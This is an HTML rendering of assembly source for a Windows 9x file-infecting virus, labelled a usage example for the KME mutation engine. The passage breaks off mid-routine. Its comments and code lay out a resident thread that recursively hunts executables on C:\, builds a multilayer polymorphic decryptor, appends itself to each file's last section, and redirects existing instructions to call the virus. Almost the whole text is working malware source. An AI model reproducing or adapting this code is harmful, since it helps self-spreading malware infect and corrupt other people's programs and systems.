<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>examplo.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;             win9X.KME55X.Examplo virus -- KME usage example</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 1. Per-process resident (create new thread) PE EXE infector.</span><span class="sc0">
</span><span class="sc1">; 2. In new thread: recursively scans C:\ for *.EXE</span><span class="sc0">
</span><span class="sc1">; 3. Multilayer KME decryptor will be built, and appended to last section.</span><span class="sc0">
</span><span class="sc1">; 4. All infected files will grow by MAXVIRSIZE const - and it may be</span><span class="sc0">
</span><span class="sc1">;    changed to whatever you want.</span><span class="sc0">
</span><span class="sc1">; 5. Do not modify entrypoint. Find all MOV EAX, FS:[00000000h] within</span><span class="sc0">
</span><span class="sc1">;    1st section, and replace with CALL VIRUS.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">MAXVIRSIZE</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1048576</span><span class="sc0">  </span><span class="sc1">; &lt;-- the more size, the more layers</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">consts.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">kme.inc</span><span class="sc0">

                        </span><span class="sc5">p386</span><span class="sc0">
                        </span><span class="sc5">model</span><span class="sc0">   </span><span class="sc10">flat</span><span class="sc0">
                        </span><span class="sc5">locals</span><span class="sc0">  </span><span class="sc5">__</span><span class="sc0">

                        </span><span class="sc9">.data</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">virstart</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">virentry</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__seh_init</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__seh_error</span><span class="sc0">
</span><span class="sc5">__seh_init</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">-</span><span class="sc5">virstart</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_func_names</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">__exit</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc12">'A92'</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">x_FindAtomA</span><span class="sc4">-</span><span class="sc5">virstart</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__exit</span><span class="sc0">  </span><span class="sc1">; exit if alredy set</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc12">'A92'</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">x_AddAtomA</span><span class="sc4">-</span><span class="sc5">virstart</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">virmemory</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">40h</span><span class="sc0">     </span><span class="sc1">; GMEM_FIXED+GMEM_ZEROINIT</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">x_GlobalAlloc</span><span class="sc4">-</span><span class="sc5">virstart</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__exit</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">-</span><span class="sc5">virstart</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virmemory</span><span class="sc0">  </span><span class="sc1">; i.e. with initialized APIs</span><span class="sc0">
                        </span><span class="sc6">cld</span><span class="sc0">
                        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">  </span><span class="sc1">; thread arg = vir base</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">newthread</span><span class="sc4">-</span><span class="sc5">virstart</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; start address</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; stack size. 0==same as in primary thread</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">x_CreateThread</span><span class="sc4">-</span><span class="sc5">virstart</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">__exit</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">__seh_error</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">newthread</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; thread arg = vir base</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__seh_init</span><span class="sc0">      </span><span class="sc1">; SEH,</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Self-Exception Handling,</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__seh_error</span><span class="sc0">
</span><span class="sc5">__seh_init</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAXVIRSIZE</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">40h</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">x_GlobalAlloc</span><span class="sc4">-</span><span class="sc5">virstart</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">tempbufptr</span><span class="sc4">-</span><span class="sc5">virstart</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc1">; EDI=ff_struc</span><span class="sc0">
                        </span><span class="sc1">; EDX=dir</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">ff_struc</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc12">'\:C'</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">        </span><span class="sc1">; EDX='C:\',0</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">process_directory</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">+</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">ff_struc</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tempbufptr</span><span class="sc4">-</span><span class="sc5">virstart</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">x_GlobalFree</span><span class="sc4">-</span><span class="sc5">virstart</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">__seh_error</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">get_func_names</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">imp_name</span><span class="sc4">-</span><span class="sc5">virstart</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">imp_addr</span><span class="sc4">-</span><span class="sc5">virstart</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">__cycle</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_proc_address</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__error</span><span class="sc0">
                        </span><span class="sc6">stosd</span><span class="sc0">

</span><span class="sc5">__scan0</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">lodsb</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__scan0</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__cycle</span><span class="sc0">

</span><span class="sc5">__success</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">clc</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">__error</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">stc</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; input:  ESI=function name wihtin kernel32 (4ex 'CreateProcessA')</span><span class="sc0">
</span><span class="sc1">; action: analyze kernel export table</span><span class="sc0">
</span><span class="sc1">; output: ZF=1, EAX=0 (function not found)</span><span class="sc0">
</span><span class="sc1">;         ZF=0, EAX=function va</span><span class="sc0">

</span><span class="sc5">get_proc_address</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BFF70000h</span><span class="sc0">         </span><span class="sc1">; get_kernel_base</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.mz_neptr</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.pe_exporttablerva</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">; current index</span><span class="sc0">
</span><span class="sc5">__search_cycle</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc5">.ex_namepointersrva</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; name va</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">        </span><span class="sc1">; +imagebase</span><span class="sc0">

                        </span><span class="sc6">pusha</span><span class="sc0">                   </span><span class="sc1">; compare names</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">__cmp_cycle</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__cmp_done</span><span class="sc0">
                        </span><span class="sc6">cmpsb</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__cmp_cycle</span><span class="sc0">
</span><span class="sc5">__cmp_done</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">popa</span><span class="sc0">

                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__name_found</span><span class="sc0">

                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; index++</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc5">.ex_numofnamepointers</span><span class="sc0">
                        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">__search_cycle</span><span class="sc0">

</span><span class="sc5">__return_0</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; return 0</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__return</span><span class="sc0">

</span><span class="sc5">__name_found</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc5">.ex_ordinaltablerva</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">        </span><span class="sc1">; +imagebase</span><span class="sc0">
                        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc1">; edx=current ordinal</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc5">.ex_addresstablerva</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">        </span><span class="sc1">; +imagebase</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc1">; eax=current address</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">        </span><span class="sc1">; +imagebase</span><span class="sc0">

</span><span class="sc5">__return</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">.popa_eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; popa.eax</span><span class="sc0">
                        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; subroutine: process_directory</span><span class="sc0">
</span><span class="sc1">; action:     1. find all files in the current directory</span><span class="sc0">
</span><span class="sc1">;             2. for each found directory (except "."/"..") recursive call;</span><span class="sc0">
</span><span class="sc1">;                for each found file call process_file</span><span class="sc0">
</span><span class="sc1">; input:      EDI=ff_struc</span><span class="sc0">
</span><span class="sc1">;             EDX=directory name</span><span class="sc0">
</span><span class="sc1">; output:     none</span><span class="sc0">

</span><span class="sc5">process_directory</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc6">lodsb</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__1</span><span class="sc0">

                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc13">'\'
</span><span class="sc0">                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__3</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">__3</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'*.*'</span><span class="sc0">
                        </span><span class="sc6">stosd</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc4">]</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">x_FindFirstFileA</span><span class="sc4">-</span><span class="sc5">virstart</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__quit</span><span class="sc0">

</span><span class="sc5">__cycle</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.ff_fullname</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">__strcpy</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">lodsb</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__strcpy</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

                        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.ff_attr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__dir</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">process_file</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__next</span><span class="sc0">
</span><span class="sc5">__dir</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.ff_fullname</span><span class="sc0">
